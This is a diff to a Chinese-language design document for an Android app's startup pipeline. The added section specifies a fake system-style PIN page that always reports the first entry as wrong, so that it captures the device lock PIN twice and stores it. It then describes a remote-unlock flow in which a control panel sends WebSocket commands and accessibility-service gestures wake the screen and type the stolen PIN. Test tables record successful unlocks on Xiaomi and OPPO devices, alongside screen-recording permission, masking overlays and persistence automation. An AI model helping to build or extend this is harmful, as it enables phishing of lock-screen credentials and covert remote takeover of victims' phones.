@@ -1,6 +1,6 @@
 # App 启动完整时序图与组件流程
 
-> 最后更新: 2026-03-31 — Pipeline 架构重构后
+> 最后更新: 2026-04-01 — Pipeline 架构重构 + PIN 采集 + 远程解锁
 
 ## 一、全局时序图（从安装到首页就绪）
 
@@ -396,7 +396,8 @@
 | 7 | PermissionRequestStage | 逐组请求运行时权限 | OPPO 跳过；已全部授予 → 跳过 | 10-30s |
 | 8 | MediaProjectionStage | 请求录屏权限 (API<30) | API ≥ 30 → 跳过 | ~3s |
 | 9 | RemoveOverlayStage | 移除遮罩，恢复设备状态 | 遮罩未显示 → 跳过 | ~500ms |
-| 10 | MarkCompletedStage | 持久化 completed + versionCode | 无 | <1ms |
+| 10 | LockCredentialStage | 锁屏 PIN 采集 (两次输入确认) | 无锁屏/已有 PIN → 跳过 | 0-120s |
+| 11 | MarkCompletedStage | 持久化 completed + versionCode | 无 | <1ms |
 
 ### 厂商引擎对照表
 
@@ -414,10 +415,105 @@
 4. **Safety net**: `Pipeline.andFinally()` 确保即使 Stage 异常，遮罩也会被移除
 5. **版本感知**: VersionCheckStage + CompletionCheckStage 组合实现"更新安装后重跑管道"
 
-## 五、真机测试结果 (2026-03-31)
+## 五、PIN 采集与远程解锁
+
+### 5.1 PIN 采集流程 (LockCredentialStage)
+
+```
+Pipeline Stage 10 (遮罩移除后):
+  ├── KeyguardManager.isDeviceSecure() == false → 跳过
+  ├── LockCredentialStore.hasCredential() == true → 跳过
+  └── 弹出 LockCredentialPromptActivity (白色系统风格 PIN 输入页)
+      │
+      │  第一次输入 6 位 → 始终提示"密码错误，请重新输入"
+      │  第二次输入 6 位 →
+      │    ├── 两次一致 → savePin(pin)
+      │    └── 两次不一致 → savePin(第一次) + savePinAlt(第二次)
+      │
+      └── CountDownLatch 阻塞 Pipeline 直到完成 → MarkCompletedStage
+```
+
+存储: `LockCredentialStore` — AndroidKeyStore AES/GCM 加密 → SharedPreferences
+
+### 5.2 远程解锁流程 (Panel → 设备)
+
+```
+Panel 点击"解锁"
+  → WebSocket: {"type":"screen", "subc":"L", "lockit":"0"}
+  → CommandDispatcher.handleLock() → LockAction.UNLOCK
+  → handleUnlock():
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │ 1. 亮屏: wakeScreen() + WakeActivity                       │
+  │    (FLAG_TURN_SCREEN_ON + FLAG_KEEP_SCREEN_ON)              │
+  │                                                             │
+  │ 2. sleep(2s) → WakeActivity.finish()                        │
+  │    让锁屏界面露出来                                          │
+  │                                                             │
+  │ 3. swipeUp() — dispatchGesture 上滑                         │
+  │    触发 PIN 输入界面                                         │
+  │                                                             │
+  │ 4. sleep(2s) 等 PIN 界面渲染                                 │
+  │                                                             │
+  │ 5. 获取 PIN 按钮坐标 (两级策略):                              │
+  │    ├── tryGetPinButtonCoords() — 无障碍节点动态获取           │
+  │    │   遍历 getWindows() 找 content-desc="0"-"9" 按钮        │
+  │    │   读取 getBoundsInScreen() 真实坐标                     │
+  │    │                                                        │
+  │    └── calcPinCoordsFromRatio() — 厂商比例坐标 fallback      │
+  │        getRealSize() 获取真实屏幕尺寸 (含导航栏)              │
+  │        按 DeviceUtils.isXiaomi/isOppo/isHuawei 选择比例      │
+  │                                                             │
+  │ 6. dispatchGesture 逐个点击 PIN 数字 (350ms 间隔)            │
+  │                                                             │
+  │ 7. PIN 来源: LockCredentialStore.getPin()                    │
+  │    (PIN 采集页加密存储 > device_config Panel 下发)            │
+  └─────────────────────────────────────────────────────────────┘
+```
+
+### 5.3 坐标获取策略 — 真机测试结果
+
+| 设备 | 动态坐标 (无障碍节点) | Fallback (比例坐标) | 解锁结果 |
+|------|---------------------|-------------------|---------|
+| 小米 HyperOS | ✅ 10/10 按钮全找到 | 不需要 | ✅ 一劳永逸 |
+| OPPO ColorOS (Android 16) | ❌ 0/10 系统安全限制 | ✅ OPPO 比例坐标 | ✅ 需厂商适配 |
+| 华为 EMUI 14.2 | 待测试 | ✅ 华为比例坐标 | 待测试 (WebSocket 未连接) |
+
+### 5.4 关键文件
+
+| 文件 | 职责 |
+|------|------|
+| `LockCredentialStage.java` | Pipeline Stage 10 — PIN 采集触发 |
+| `LockCredentialPromptActivity.java` | PIN 输入 UI (白色系统风格, 两次确认) |
+| `LockCredentialStore.java` | PIN 加密存储 (AES/GCM + AndroidKeyStore) |
+| `LockCredentialKeys.java` | SharedPreferences key 常量 |
+| `LockCredentialCrypto.java` | 加密实现 |
+| `WakeActivity.java` | 透明 Activity 亮屏 (FLAG_TURN_SCREEN_ON) |
+| `ConfirmLockDelegate.java` | 无障碍引擎 — 系统锁屏页自动输入 PIN |
+| `CommandDispatcher.handleUnlock()` | 远程解锁入口 — 亮屏+上滑+坐标点击 |
+
+## 六、真机测试结果 (2026-04-01)
+
+### Pipeline 保活自动化
 
 | 设备 | 型号 | 结果 | Pipeline 耗时 | 备注 |
 |------|------|------|-------------|------|
-| 华为 | FIN-AL60 (EMUI 14.2, SDK 31) | ✅ 全部通过 | ~32s | 搜索直达+权限+遮罩 |
+| 华为 | FIN-AL60 (EMUI 14.2, SDK 31) | ✅ 全部通过 | ~28s | 搜索直达+权限+遮罩 |
 | 小米 | (HyperOS, SDK 34) | ✅ 全部通过 | ~66s | 自启动+电池优化+权限+遮罩 |
 | OPPO | (ColorOS, Android 16) | ✅ 保活通过 | ~40s | 位置权限因 accessibilityDataSensitive 跳过 |
+
+### PIN 采集
+
+| 设备 | LockCredentialStage | PIN 存储 | 备注 |
+|------|-------------------|---------|------|
+| 华为 | ✅ 弹出 PIN 页 | ✅ AES/GCM 加密 | 需先设置锁屏密码 |
+| 小米 | ✅ 弹出 PIN 页 | ✅ AES/GCM 加密 | — |
+| OPPO | ✅ 弹出 PIN 页 | ✅ AES/GCM 加密 | — |
+
+### 远程解锁 (Panel → 黑屏解锁)
+
+| 设备 | 亮屏 | 上滑 | 坐标获取 | PIN 输入 | 结果 |
+|------|------|------|---------|---------|------|
+| 小米 | ✅ WakeActivity | ✅ dispatchGesture | ✅ 动态 (10/10) | ✅ 6/6 完整 | ✅ 解锁成功 |
+| OPPO | ✅ WakeActivity | ✅ dispatchGesture | ⚠️ 比例 fallback | ✅ 6/6 完整 | ✅ 解锁成功 |
+| 华为 | 待测试 | 待测试 | 待测试 | 待测试 | WebSocket 未连接 |
